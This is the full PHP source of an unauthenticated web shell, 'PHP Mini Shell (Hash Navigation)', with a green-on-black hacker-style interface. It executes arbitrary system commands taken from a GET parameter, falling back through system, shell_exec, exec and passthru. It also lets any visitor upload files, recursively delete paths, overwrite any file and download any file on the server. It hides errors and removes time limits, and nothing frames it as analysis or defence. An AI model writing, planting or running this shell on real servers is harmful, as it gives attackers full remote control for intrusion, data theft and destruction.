<?php
error_reporting(0);
set_time_limit(0);

// Set the current working directory from the 'dir' GET parameter
$cwd = isset($_GET['dir']) ? $_GET['dir'] : getcwd();
@chdir($cwd);
$cwd = getcwd();

// --- BACKEND LOGIC (File Operations) ---

// File Upload
if (isset($_FILES['file'])) {
    if (move_uploaded_file($_FILES['file']['tmp_name'], $cwd . '/' . $_FILES['file']['name'])) {
        $msg = "Upload success!";
    } else {
        $msg = "Upload failed!";
    }
}

// Delete File or Folder
if (isset($_GET['delete'])) {
    $target = $_GET['delete'];
    if (is_dir($target)) {
        // Simple recursive delete for directories
        function rrmdir($dir) {
           if (is_dir($dir)) {
             $objects = scandir($dir);
             foreach ($objects as $object) {
               if ($object != "." && $object != "..") {
                 if (is_dir($dir."/".$object))
                   rrmdir($dir."/".$object);
                 else
                   unlink($dir."/".$object);
               }
             }
             rmdir($dir);
           }
        }
        rrmdir($target);
    } else {
        @unlink($target);
    }
    // Redirect to clean up URL
    header('Location: ?dir=' . urlencode($cwd));
    exit;
}

// Create Folder
if (isset($_POST['newfolder']) && !empty($_POST['newfolder'])) {
    @mkdir($_POST['newfolder']);
}

// Save Edited File
if (isset($_POST['editfile']) && isset($_POST['content'])) {
    @file_put_contents($_POST['editfile'], $_POST['content']);
}

// Download File
if (isset($_GET['download'])) {
    $file = $_GET['download'];
    if (file_exists($file) && is_file($file)) {
        header('Content-Type: application/octet-stream');
        header('Content-Disposition: attachment; filename="' . basename($file) . '"');
        readfile($file);
        exit;
    }
}

// --- AJAX ENDPOINT & HELPER FUNCTIONS ---

// This function generates the HTML for the file list.
function render_file_list($current_dir) {
    $files = @scandir($current_dir);
    if ($files === false) {
        echo "<ul><li><span style='color: red;'>Cannot open directory.</span></li></ul>";
        return;
    }
    
    echo "<ul>";
    // Link to parent directory
    if ($current_dir !== '/') {
        $parent_dir = dirname($current_dir);
        echo "<li><a href='#" . urlencode($parent_dir) . "'>.. [Parent Directory]</a></li>";
    }

    foreach ($files as $f) {
        if ($f === '.' || $f === '..') continue;
        $path = $current_dir . '/' . $f;
        
        echo "<li>";
        if (is_dir($path)) {
            echo "[DIR] <a href='#" . urlencode($path) . "'>$f</a>";
        } else {
            echo "[FILE] $f ";
        }
        
        // Action links
        $delete_url = '?dir=' . urlencode($current_dir) . '&delete=' . urlencode($path);
        echo " <a href='$delete_url' onclick='return confirm(\"Delete this?\")'>[delete]</a>";

        if (!is_dir($path)) {
            $edit_url = '?dir=' . urlencode($current_dir) . '&edit=' . urlencode($path);
            $download_url = '?dir=' . urlencode($current_dir) . '&download=' . urlencode($path);
            echo " <a href='$edit_url'>[edit]</a>";
            echo " <a href='$download_url'>[download]</a>";
        }
        echo "</li>";
    }
    echo "</ul>";
}

// If the 'ajax' parameter is set, only return the file list and stop.
if (isset($_GET['ajax'])) {
    render_file_list($cwd);
    exit;
}

// --- FRONTEND (HTML & JavaScript) ---
?>
<!DOCTYPE html>
<html>
<head>
    <title>PHP Mini Shell (Hash Navigation)</title>
    <style>
        body { background: #111; color: #0f0; font-family: monospace; padding: 20px; }
        .container { max-width: 900px; margin: auto; }
        input, textarea, button { background: #222; color: #0f0; border: 1px solid #0f0; padding: 5px; margin-bottom: 10px; width: 100%; box-sizing: border-box; }
        a { color: #0ff; text-decoration: none; }
        a:hover { text-decoration: underline; }
        form { border: 1px solid #0f0; padding: 10px; margin-bottom: 20px; }
        h2, h3 { border-bottom: 1px solid #0f0; padding-bottom: 5px; }
        ul { list-style: none; padding: 0; }
        li { padding: 3px; border-bottom: 1px solid #333; }
        pre { background: #000; padding: 10px; border: 1px solid #0f0; white-space: pre-wrap; word-wrap: break-word; }
    </style>
</head>
<body>
<div class="container">

    <h2>Mini Shell - Hash Navigation ⚡</h2>
    <p><b>Current Directory:</b> <span id="cwd-path"><?= htmlspecialchars($cwd) ?></span></p>
    <?php if (isset($msg)) echo "<p><b>Status:</b> $msg</p>"; ?>

    <h3>Execute Command</h3>
    <form id="cmd-form" method="GET">
        <input type="hidden" name="dir" value="<?= htmlspecialchars($cwd) ?>">
        <input type="text" name="cmd" placeholder="Enter command..." autocomplete="off">
        <button type="submit">Execute</button>
    </form>

    <?php
    if (isset($_GET['cmd'])) {
        echo "<h3>Command Output</h3><pre>";
        $cmd = $_GET['cmd'];
        if (function_exists('system')) { system($cmd); }
        elseif (function_exists('shell_exec')) { echo shell_exec($cmd); }
        elseif (function_exists('exec')) { exec($cmd, $out); echo implode("\n", $out); }
        elseif (function_exists('passthru')) { passthru($cmd); }
        else { echo "Command execution functions are disabled."; }
        echo "</pre>";
    }
    ?>

    <h3>File Management</h3>
    <div style="display: flex; gap: 20px;">
        <div style="flex: 1;">
            <form id="upload-form" method="POST" enctype="multipart/form-data">
                <input type="hidden" name="dir" value="<?= htmlspecialchars($cwd) ?>">
                <label>Upload File</label>
                <input type="file" name="file">
                <button type="submit">Upload</button>
            </form>
        </div>
        <div style="flex: 1;">
            <form id="newfolder-form" method="POST">
                <input type="hidden" name="dir" value="<?= htmlspecialchars($cwd) ?>">
                <label>Create New Folder</label>
                <input type="text" name="newfolder" placeholder="New folder name">
                <button type="submit">Create</button>
            </form>
        </div>
    </div>


    <h3>Directory Listing</h3>
    <div id="file-list">
        <?php render_file_list($cwd); ?>
    </div>

    <?php
    // Edit file form
    if (isset($_GET['edit'])) {
        $target = $_GET['edit'];
        $content = @file_get_contents($target);
        echo "<h3>Editing File: " . htmlspecialchars($target) . "</h3>";
        echo "<form id='edit-form' method='POST'>";
        echo "<input type='hidden' name='dir' value='" . htmlspecialchars($cwd) . "'>";
        echo "<input type='hidden' name='editfile' value='" . htmlspecialchars($target) . "'>";
        echo "<textarea name='content' rows='20'>" . htmlspecialchars($content) . "</textarea>";
        echo "<button type='submit'>Save Changes</button>";
        echo "</form>";
    }
    ?>
</div>

<script>
    // This script block handles the client-side hash navigation
    document.addEventListener('DOMContentLoaded', () => {
        const fileListDiv = document.getElementById('file-list');
        const cwdPathSpan = document.getElementById('cwd-path');
        
        // Forms that need their 'dir' parameter updated dynamically
        const formsToUpdate = [
            document.getElementById('cmd-form'),
            document.getElementById('upload-form'),
            document.getElementById('newfolder-form'),
            document.getElementById('edit-form')
        ].filter(form => form != null); // Filter out nulls (like the edit form if not present)

        // Function to fetch and update directory content
        async function updateContent(path) {
            // Update the browser's display path
            cwdPathSpan.textContent = path;

            // Update the hidden 'dir' input in all forms so submissions go to the correct directory
            formsToUpdate.forEach(form => {
                const dirInput = form.querySelector('input[name="dir"]');
                if (dirInput) {
                    dirInput.value = path;
                }
            });
            
            // Fetch the new file list from our PHP 'API' endpoint
            try {
                const response = await fetch(`?ajax=true&dir=${encodeURIComponent(path)}`);
                if (!response.ok) {
                    throw new Error(`HTTP error! status: ${response.status}`);
                }
                const newHtml = await response.text();
                fileListDiv.innerHTML = newHtml;
            } catch (error) {
                fileListDiv.innerHTML = `<ul><li><span style="color: red;">Failed to load directory: ${error.message}</span></li></ul>`;
            }
        }

        // Function to handle hash changes
        function handleHashChange() {
            // Get path from hash, decode it, and default to the server-rendered CWD if hash is empty
            const defaultPath = '<?= addslashes($cwd) ?>';
            let path = decodeURIComponent(window.location.hash.substring(1));
            if (!path) {
                path = defaultPath;
            }
            updateContent(path);
        }

        // Listen for hash changes
        window.addEventListener('hashchange', handleHashChange);

        // Initial load: if there's a hash, use it. Otherwise, stay on the default directory.
        if (window.location.hash) {
            handleHashChange();
        }
    });
</script>

</body>
</html>
